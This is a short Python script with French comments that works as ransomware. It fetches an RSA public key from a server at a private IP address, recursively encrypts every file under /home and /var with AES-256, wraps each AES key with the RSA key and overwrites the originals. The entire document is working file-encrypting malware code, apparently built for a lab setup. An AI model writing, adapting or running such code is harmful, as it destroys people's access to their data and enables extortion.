import os
import socket
import json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

def encrypt_file(file_path, public_key):
    # Générer une clé AES aléatoire et un vecteur d'initialisation (IV)
    key = os.urandom(32)  # Clé AES-256
    iv = os.urandom(16)   # IV pour AES

    # Chiffrer le fichier avec AES
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = encryptor.update(file_data) + encryptor.finalize()

    # Chiffrer la clé AES avec la clé publique RSA
    encrypted_key = public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Convertir les données binaires en base64 pour la sérialisation JSON
    encrypted_file_data = {
        'encrypted_key': base64.b64encode(encrypted_key).decode('utf-8'),
        'iv': base64.b64encode(iv).decode('utf-8'),
        'encrypted_data': base64.b64encode(encrypted_data).decode('utf-8')
    }

    # Écraser le fichier original avec les données chiffrées en base64
    with open(file_path, 'wb') as file:
        file.write(json.dumps(encrypted_file_data).encode())

# Se connecter au serveur pour obtenir la clé publique
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('192.168.146.138', 5000))
public_key_serialized = client_socket.recv(4096)
public_key = serialization.load_pem_public_key(public_key_serialized)

# Chiffrement des fichiers dans /home et /var
directories_to_encrypt = ['/home', '/var']
for directory in directories_to_encrypt:
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, public_key)

client_socket.close()
